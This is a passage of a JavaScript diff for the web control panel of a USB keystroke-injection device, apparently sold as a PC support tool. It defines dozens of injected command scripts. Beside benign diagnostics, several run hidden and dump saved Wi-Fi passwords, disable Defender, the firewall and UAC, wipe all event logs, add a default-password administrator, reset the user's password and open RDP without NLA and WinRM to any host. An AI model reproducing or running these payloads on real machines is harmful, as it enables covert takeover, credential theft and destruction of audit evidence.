+  eventvwr:     'WINDOWS r\nDELAY 500\nSTRING eventvwr.msc\nENTER',
+  diskpart:     'WINDOWS r\nDELAY 500\nSTRING diskmgmt.msc\nENTER',
+  regedit:      'WINDOWS r\nDELAY 500\nSTRING regedit\nENTER',
+  services:     'WINDOWS r\nDELAY 500\nSTRING services.msc\nENTER',
+  restart_pc:   'WINDOWS r\nDELAY 500\nSTRING shutdown /r /t 5\nENTER',
+  shutdown_pc:  'WINDOWS r\nDELAY 500\nSTRING shutdown /s /t 5\nENTER',
+  lock_pc:      'WINDOWS l',
+  ipconfig:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "ipconfig /all | Set-Clipboard"\nENTER',
+  netstat:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "netstat -an | Set-Clipboard"\nENTER',
+  arp:          'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "arp -a | Set-Clipboard"\nENTER',
+  wifi_profiles:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(netsh wlan show profiles) -match \'All User\' | ForEach-Object { $n=($_ -split \':\'  )[1].Trim(); $p=(netsh wlan show profile $n key=clear)-match \'Key Content\'; [pscustomobject]@{SSID=$n;Password=($p -split \':\')[1].Trim()} } | Out-String | Set-Clipboard"\nENTER',
+  flush_dns:    'WINDOWS r\nDELAY 500\nSTRING cmd /c ipconfig /flushdns\nENTER',
+  ncm_mode:     null,
+  ping_gw:      'WINDOWS r\nDELAY 500\nSTRING cmd /k ping -t $(powershell -c "(Get-NetRoute -DestinationPrefix \'0.0.0.0/0\').NextHop | Select-Object -First 1")\nENTER',
+  clear_temp:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Remove-Item $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue"\nENTER',
+  sfc:          'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k sfc /scannow\' -Verb RunAs"\nENTER',
+  dism:         'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process powershell -ArgumentList \'DISM /Online /Cleanup-Image /RestoreHealth\' -Verb RunAs"\nENTER',
+  disk_cleanup: 'WINDOWS r\nDELAY 500\nSTRING cleanmgr /sagerun:1\nENTER',
+  chkdsk:       'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k echo y | chkdsk C: /f /r\' -Verb RunAs"\nENTER',
+  update_drivers:'WINDOWS r\nDELAY 500\nSTRING ms-settings:windowsupdate\nENTER',
+  clear_eventlog:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }" -Verb RunAs\nENTER',
+  disable_defender:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"\nENTER',
+  enable_defender: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-MpPreference -DisableRealtimeMonitoring $false -DisableIOAVProtection $false -DisableScriptScanning $false -DisableBehaviorMonitoring $false"\nENTER',
+  disable_firewall:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"\nENTER',
+  enable_firewall: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"\nENTER',
+  uac_disable:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name EnableLUA -Value 0 -Force"\nENTER',
+  mount_sd:     null,
+  add_admin:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net user admin admin /add; net localgroup administrators admin /add"\nENTER',
+  rdp_enable:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Terminal\ Server -name fDenyTSConnections -Value 0; Enable-NetFirewallRule -DisplayGroup \'Remote Desktop\'"\nENTER',
+  rdp_nla_off:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path \'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\' -Name UserAuthentication -Value 0"\nENTER',
+  rdp_password: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net user $env:USERNAME cf2024!"\nENTER',
+  rdp_user:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net localgroup \'Remote Desktop Users\' $env:USERNAME /add"\nENTER',
+  rdp_port:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-NetFirewallRule -DisplayGroup \'Remote Desktop\' | Select-Object -First 1).Enabled | Set-Clipboard"\nENTER',
+  anydesk_sd:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\AnyDesk.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\AnyDesk.exe\')}"\nENTER',
+  teamviewer_sd:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\TeamViewerQS.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\TeamViewerQS.exe\')}"\nENTER',
+  rustdesk_sd:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\RustDesk.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\RustDesk.exe\')}"\nENTER',
+  supremo_sd:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\Supremo.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\Supremo.exe\')}"\nENTER',
+  ssh_enable:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType Automatic; New-NetFirewallRule -Name sshd -DisplayName OpenSSH -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22" -Verb RunAs\nENTER',
+  winrm_enable: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Enable-PSRemoting -Force; Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force" -Verb RunAs\nENTER',
+  psremoting:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Enable-PSRemoting -Force" -Verb RunAs\nENTER',
+  ssh_keyscan:  'WINDOWS r\nDELAY 500\nSTRING powershell -c "Get-Content $env:ProgramData\\ssh\\ssh_host_ed25519_key.pub | Set-Clipboard"\nENTER',
+  admin_create_cf:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net user cfrsupport cf2024! /add; net localgroup Administrators cfrsupport /add"\nENTER',
+  admin_remove_cf:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net user cfrsupport /delete"\nENTER',
+  autologin:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "reg add \'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' /v AutoAdminLogon /t REG_SZ /d 1 /f; reg add \'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' /v DefaultUserName /t REG_SZ /d cfrsupport /f"\nENTER',
+  user_list:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "net user | Set-Clipboard"\nENTER',
+  wol_enable:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Get-NetAdapter | ForEach-Object { Set-NetAdapterAdvancedProperty -Name $_.Name -RegistryKeyword WakeOnMagicPacket -RegistryValue 1 -ErrorAction SilentlyContinue }"\nENTER',
+  mac_clipboard:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-NetAdapter | Where-Object Status -eq Up | Select-Object -First 1).MacAddress | Set-Clipboard"\nENTER',
+  ip_info:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "ipconfig | Set-Clipboard"\nENTER',
+  mount_sd_fw:  null,
+  sys_report_sd:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; msinfo32 /report ($sd+\'sys_report.txt\')"\nENTER',
+  dxdiag_sd:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; dxdiag /t ($sd+\'dxdiag.txt\')"\nENTER',
+  winver:       'WINDOWS r\nDELAY 500\nSTRING winver\nENTER',
+  hwinfo_clip:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-ComputerInfo | Out-String) | Set-Clipboard"\nENTER',
+  activation_check:'WINDOWS r\nDELAY 500\nSTRING powershell -c "(Get-WmiObject SoftwareLicensingProduct | Where-Object LicenseStatus -eq 1 | Select-Object Name,ProductKeyChannel | Out-String) | Set-Clipboard"\nENTER',
+  battery_report:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; if(!$sd){$sd=$env:USERPROFILE+\'\\\\\'}; powercfg /batteryreport /output ($sd+\'battery_report.html\')"\nENTER',
+  battery_clip:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_Battery | Select-Object EstimatedChargeRemaining,BatteryStatus | Out-String) | Set-Clipboard"\nENTER',
+  sleep_report:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; powercfg /energy /output ($sd+\'energy_report.html\')"\nENTER',
+  power_plan:    'WINDOWS r\nDELAY 500\nSTRING powercfg.cpl\nENTER',
+  power_high:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"\nENTER',
+  smart_sd:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (wmic diskdrive get model,status,size | Out-String) | Out-File ($sd+\'smart.txt\')"\nENTER',
+  smart_clip:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(wmic diskdrive get model,status,size | Out-String) | Set-Clipboard"\nENTER',
+  disk_space:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free | Out-String) | Set-Clipboard"\nENTER',
+  crystaldisk_sd:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\CrystalDiskInfo.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\CrystalDiskInfo.exe\')}"\nENTER',
+  mem_diag:      'WINDOWS r\nDELAY 500\nSTRING mdsched\nENTER',
+  ram_info:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_PhysicalMemory | Select-Object Manufacturer,Capacity,Speed | Out-String) | Set-Clipboard"\nENTER',
+  cpu_info:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_Processor | Select-Object Name,NumberOfCores,MaxClockSpeed | Out-String) | Set-Clipboard"\nENTER',
+  temp_info:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace root/wmi -ErrorAction SilentlyContinue | Out-String) | Set-Clipboard"\nENTER',
+  process_top:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-Process | Sort-Object CPU -Desc | Select-Object -First 15 | Select-Object Name,CPU,WorkingSet,Id | Out-String) | Set-Clipboard"\nENTER',
+  hwinfo_sd:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\HWiNFO64.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\HWiNFO64.exe\')}"\nENTER',
+  driver_sd:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; driverquery /fo csv | Out-File ($sd+\'drivers.csv\')"\nENTER',
+  driver_unsigned:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_PnPSignedDriver | Where-Object IsSigned -eq False | Select-Object DeviceName,DriverVersion | Out-String) | Set-Clipboard"\nENTER',
+  problem_devices:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_PnPEntity | Where-Object ConfigManagerErrorCode -ne 0 | Select-Object Name,ConfigManagerErrorCode | Out-String) | Set-Clipboard"\nENTER',
+  usb_devices:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_USBHub | Select-Object Name,DeviceID | Out-String) | Set-Clipboard"\nENTER',
+  reliability:   'WINDOWS r\nDELAY 500\nSTRING perfmon /rel\nENTER',
+  crash_report:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (Get-WinEvent -FilterHashtable @{LogName=\'System\';Level=1,2} -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message | Out-String) | Out-File ($sd+\'crashlog.txt\')"\nENTER',
+  bsod_check:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WinEvent -FilterHashtable @{LogName=\'System\';Id=41,1001} -MaxEvents 20 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Message | Out-String) | Set-Clipboard"\nENTER',
+  minidump_sd:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; if(Test-Path C:\\Windows\\Minidump){Copy-Item C:\\Windows\\Minidump\\* $sd -Force}"\nENTER',
+  bios_boot_menu:'DELAY 500\nF12\nDELAY 200\nF12\nDELAY 200\nF12\nDELAY 200\nF12',
+  winpe_reboot:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "shutdown /r /o /t 0" -Verb RunAs\nENTER',
+  uefi_reboot:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "shutdown /fw /r /t 0" -Verb RunAs\nENTER',
+  recuva_sd:     'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\Recuva.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\Recuva.exe\')}"\nENTER',
+  malwarebytes_sd:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\MBSetup.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\MBSetup.exe\')}"\nENTER',
+  procexp_sd:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\procexp64.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\procexp64.exe\')}"\nENTER',
+  autoruns_sd:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem|Where-Object {Test-Path ($_.Root+\'PortableApps\\Autoruns64.exe\')}).Root; if($d){Start-Process ($d+\'PortableApps\\Autoruns64.exe\')}"\nENTER',
+  shadow_list:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(vssadmin list shadows | Out-String) | Set-Clipboard"\nENTER',
+  shadow_create: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-WmiObject Win32_ShadowCopy).Create(\'C:\\\\\',\'ClientAccessible\')" -Verb RunAs\nENTER',
+  recycle_show:  'WINDOWS r\nDELAY 500\nSTRING explorer.exe shell:RecycleBinFolder\nENTER',
+  prev_versions: 'WINDOWS r\nDELAY 500\nSTRING powershell -c "Start-Process explorer shell:::{f02c1a0d-be21-4350-88b0-7367fc96ef3c}"\nENTER',
+  sd_open_explorer:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$d=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; if($d){Start-Process explorer $d}"\nENTER',
+  sd_backup_docs: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; if($sd){Copy-Item $env:USERPROFILE\\Documents ($sd+\'Backup\\Documents\') -Recurse -Force}"\nENTER',
+  sd_backup_desktop:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; if($sd){Copy-Item $env:USERPROFILE\\Desktop ($sd+\'Backup\\Desktop\') -Recurse -Force}"\nENTER',
+  sfc_dism_combo:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process powershell -ArgumentList \'-NoExit -Command sfc /scannow; DISM /Online /Cleanup-Image /RestoreHealth\' -Verb RunAs"\nENTER',
+  repair_apps:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Get-AppXPackage | ForEach-Object {Add-AppxPackage -DisableDevelopmentMode -Register ($_.InstallLocation+\'\\AppXManifest.xml\') -ErrorAction SilentlyContinue}" -Verb RunAs\nENTER',
+  winsock_reset: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k netsh winsock reset & netsh int ip reset & ipconfig /flushdns\' -Verb RunAs"\nENTER',
+  windows_reset_keep:'WINDOWS r\nDELAY 500\nSTRING systemreset --factoryreset\nENTER',
+  fix_mbr:       'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bootrec /fixmbr\' -Verb RunAs"\nENTER',
+  fix_boot:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bootrec /fixboot\' -Verb RunAs"\nENTER',
+  fix_bcd:       'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bootrec /scanos & bootrec /rebuildbcd\' -Verb RunAs"\nENTER',
+  bcdedit_safe:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bcdedit /set {default} safeboot minimal\' -Verb RunAs"\nENTER',
+  safe_mode_boot:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bcdedit /set {default} safeboot minimal\' -Verb RunAs"\nENTER',
+  bcdedit_safe_net:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bcdedit /set {default} safeboot network\' -Verb RunAs"\nENTER',
+  bcdedit_normal:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process cmd -ArgumentList \'/k bcdedit /deletevalue {default} safeboot\' -Verb RunAs"\nENTER',
+  restore_point: 'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Checkpoint-Computer -Description \'G4MEOVER-Support\' -RestorePointType MODIFY_SETTINGS" -Verb RunAs\nENTER',
+  restore_open:  'WINDOWS r\nDELAY 500\nSTRING rstrui\nENTER',
+  prefetch_clear:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Remove-Item C:\\Windows\\Prefetch\\* -Force -ErrorAction SilentlyContinue"\nENTER',
+  dns_cache_clear:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Clear-DnsClientCache"\nENTER',
+  icon_cache_clear:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Remove-Item $env:LOCALAPPDATA\\IconCache.db -Force -ErrorAction SilentlyContinue; Start-Process explorer"\nENTER',
+  update_cache_clear:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Stop-Service wuauserv,bits,cryptsvc -Force -ErrorAction SilentlyContinue; Remove-Item C:\\Windows\\SoftwareDistribution\\Download\\* -Recurse -Force -ErrorAction SilentlyContinue; Start-Service wuauserv,bits,cryptsvc" -Verb RunAs\nENTER',
+  force_update:  'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-Process ms-settings:windowsupdate-action"\nENTER',
+  update_disable:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Stop-Service wuauserv -Force; Set-Service wuauserv -StartupType Disabled" -Verb RunAs\nENTER',
+  visual_effects_off:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects -Name VisualFXSetting -Value 2"\nENTER',
+  trim_ssd:      'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Optimize-Volume -DriveLetter C -ReTrim -Verbose" -Verb RunAs\nENTER',
+  page_file_reset:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$cs=Get-WmiObject Win32_ComputerSystem; $cs.AutomaticManagedPagefile=$true; $cs.Put()" -Verb RunAs\nENTER',
+  defender_scan_quick:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-MpScan -ScanType QuickScan" -Verb RunAs\nENTER',
+  defender_scan_full:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Start-MpScan -ScanType FullScan" -Verb RunAs\nENTER',
+  defender_update:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Update-MpSignature" -Verb RunAs\nENTER',
+  defender_history:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-MpThreatDetection | Select-Object ThreatName,ActionSuccess | Out-String) | Set-Clipboard"\nENTER',
+  firewall_rules_sd:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; netsh advfirewall export ($sd+\'firewall.wfw\')"\nENTER',
+  open_ports:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(netstat -an | Select-String LISTEN | Out-String) | Set-Clipboard"\nENTER',
+  process_report:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (Get-Process | Select-Object Name,Id,Path,CPU,WorkingSet | Out-String) | Out-File ($sd+\'processes.txt\')"\nENTER',
+  connection_report:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (netstat -b | Out-String) | Out-File ($sd+\'connections.txt\')"\nENTER',
+  startup_report:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Out-String) | Out-File ($sd+\'startup.txt\')"\nENTER',
+  task_report:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "$sd=(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match \'[D-Z]:\\\\\' } | Select-Object -First 1).Root; (schtasks /query /fo LIST /v | Out-String) | Out-File ($sd+\'tasks.txt\')"\nENTER',
+  hosts_check:   'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts | Out-String) | Set-Clipboard"\nENTER',
+  kill_ransomware:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Stop-Process -Name vssadmin,wbadmin,bcdedit -Force -ErrorAction SilentlyContinue; Set-NetFirewallProfile -All -Enabled True"\nENTER',
+  block_internet:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "New-NetFirewallRule -DisplayName BLOCK_ALL_OUT -Direction Outbound -Action Block -Profile Any; New-NetFirewallRule -DisplayName BLOCK_ALL_IN -Direction Inbound -Action Block -Profile Any" -Verb RunAs\nENTER',
+  uac_enable:    'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLUA -Value 1 -Force"\nENTER',
+  disable_usb_storage:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR -Name Start -Value 4"\nENTER',
+  enable_usb_storage:'WINDOWS r\nDELAY 500\nSTRING powershell -WindowStyle Hidden -c "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR -Name Start -Value 3"\nENTER',
+};
+
+function mediCatBoot(){
+  if(!confirm('Switch to USB Storage? Device will reboot.'))return;
+  fetch('/setusbstorage').then(function(){toast('&#x1F4BE; USB Storage active — MediCat SD mounted','success');}).catch(function(){toast('Error','error');});
+}
+function runRawFW(){
+  var v=document.getElementById('fw-raw').value.trim();
+  if(!v)return;
+  if(!hasHID){toast('&#x26A0; USB HID not active','warn');return;}
+  fetch('/rawinput?rawCommand='+encodeURIComponent('KEYBOARD_LAYOUT win_ch\n'+v))
+    .then(function(){toast('&#x25BA; Command sent','success');})
+    .catch(function(){toast('Failed','error');});
+}
+function pcTool(name){
+  if(name==='ncm_mode'){setUsb('ncm');return;}
+  if(name==='mount_sd'||name==='mount_sd_fw'){runPL('hid_win_defender_disable_mount_sd.ds');return;}
+  if(!hasHID){
+    var w=document.getElementById('pcsup-hid-warn');if(w)w.style.display='flex';
+    toast('&#x26A0; USB HID not active — switch USB mode first','warn');
+    return;
+  }
+  var script=PC_TOOLS[name];
+  if(!script){toast('Unknown tool','error');return;}
+  fetch('/rawinput?rawCommand='+encodeURIComponent('KEYBOARD_LAYOUT win_ch\n'+script))
+    .then(function(){toast('&#x25BA; Executed: '+name,'success');})
+    .catch(function(){toast('Failed: '+name,'error');});
+}
+
+function runRawInput(){
+  var v=document.getElementById('raw-input').value.trim();
+  if(!v)return;
+  if(!hasHID){toast('&#x26A0; USB HID not active','warn');return;}
+  fetch('/rawinput?rawCommand='+encodeURIComponent('KEYBOARD_LAYOUT win_ch\n'+v))
+    .then(function(){toast('&#x25BA; Raw command sent','success');})
+    .catch(function(){toast('Failed','error');});
+}
+
+function toast(msg,type){
+  var ic={success:'&#x2713;',error:'&#x2715;',warn:'&#x26A0;'};
+  var t=document.createElement('div');
+  t.className='toast '+(type||'success');
+  t.innerHTML='<span style="font-size:15px">'+(ic[type]||'&#x2139;')+'</span><span>'+msg+'</span>';
+  document.getElementById('toast-ct').appendChild(t);
+  setTimeout(function(){t.style.cssText='opacity:0;transform:translateX(30px);transition:all .3s ease';setTimeout(function(){t.remove()},350)},3000);
+}
+
